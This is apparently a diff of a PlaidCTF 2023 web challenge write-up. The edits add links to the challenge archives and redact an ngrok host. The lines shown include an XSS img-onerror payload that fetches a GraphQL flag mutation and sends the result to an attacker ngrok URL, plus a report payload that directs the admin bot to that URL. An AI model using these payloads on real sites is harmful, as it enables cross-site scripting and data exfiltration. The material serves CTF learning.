@@ -33,7 +33,7 @@ When I not be plunderin' the high seas, I be watchin' me favorite shows. Like an
 
 ### Enumeration
 
-**In this challenge, we can download a file:**
+**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/web/Davy-Jones-Putlocker/new-putlocker-dubs.310fe268c77d9f240661fd2679ce2ed29c50bc39d4c9f69d1fd9e92f429d0502.tar.gz):**
 ```shell
 ┌[siunam♥earth]-(~/ctf/PlaidCTF-2023/web/Davy-Jones'-Putlocker/Dubs)-[2023.04.15|13:59:35(HKT)]
 └> file new-putlocker-dubs.310fe268c77d9f240661fd2679ce2ed29c50bc39d4c9f69d1fd9e92f429d0502.tar.gz 
@@ -334,7 +334,7 @@ Now, we need to build a payload that fetches the flag, which is the GrahpQL endp
 ```html
 <img src=x onerror="async function postData() {
 const data = { 'query': 'mutation { flag }' };
-const response = await fetch('https://987a-123-203-183-20.ngrok-free.app/graphql', {
+const response = await fetch('https://987a-{Redacted}.ngrok-free.app/graphql', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json'
@@ -342,7 +342,7 @@ const response = await fetch('https://987a-123-203-183-20.ngrok-free.app/graphql
     body: JSON.stringify(data)
 });
 const text = await response.text();
-fetch('https://987a-123-203-183-20.ngrok-free.app/?d=' + text);
+fetch('https://987a-{Redacted}.ngrok-free.app/?d=' + text);
 }; postData();">
 ```
 
@@ -368,7 +368,7 @@ Nice!
 
 **GrahpQL `report` payload:**
 ```json
-{ "query": "mutation { report(url: \"https://987a-123-203-183-20.ngrok-free.app/user/bd349a2a-5040-433e-be47-d1b5a84edb2f\") }" }
+{ "query": "mutation { report(url: \"https://987a-{Redacted}.ngrok-free.app/user/bd349a2a-5040-433e-be47-d1b5a84edb2f\") }" }
 ```
 
 However, it didn't retrieve the flag...
@@ -436,7 +436,7 @@ With that said, we have to include the `Authorization` header with the JWT value
 ```html
 <img src=x onerror="async function postData() {
 const data = { 'query': 'mutation { flag }' };
-const response = await fetch('https://987a-123-203-183-20.ngrok-free.app/graphql', {
+const response = await fetch('https://987a-{Redacted}.ngrok-free.app/graphql', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json',
@@ -445,7 +445,7 @@ const response = await fetch('https://987a-123-203-183-20.ngrok-free.app/graphql
     body: JSON.stringify(data)
 });
 const text = await response.text();
-fetch('https://987a-123-203-183-20.ngrok-free.app/?d=' + text);
+fetch('https://987a-{Redacted}.ngrok-free.app/?d=' + text);
 }; postData();">
 ```
 
@@ -499,7 +499,7 @@ What we've learned:
 
 ### Enumeration
 
-**In this challenge, we can download a file:**
+**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/web/Davy-Jones-Putlocker/new-putlocker-subs.4a541aaebd390829d388a844cc6df2ec6c8769c0a4aeb1723b652421c3caa4b1.tar.gz):**
 ```shell
 ┌[siunam♥earth]-(~/ctf/PlaidCTF-2023/web/Davy-Jones'-Putlocker/Subs)-[2023.04.16|15:42:52(HKT)]
 └> file new-putlocker-subs.4a541aaebd390829d388a844cc6df2ec6c8769c0a4aeb1723b652421c3caa4b1.tar.gz 
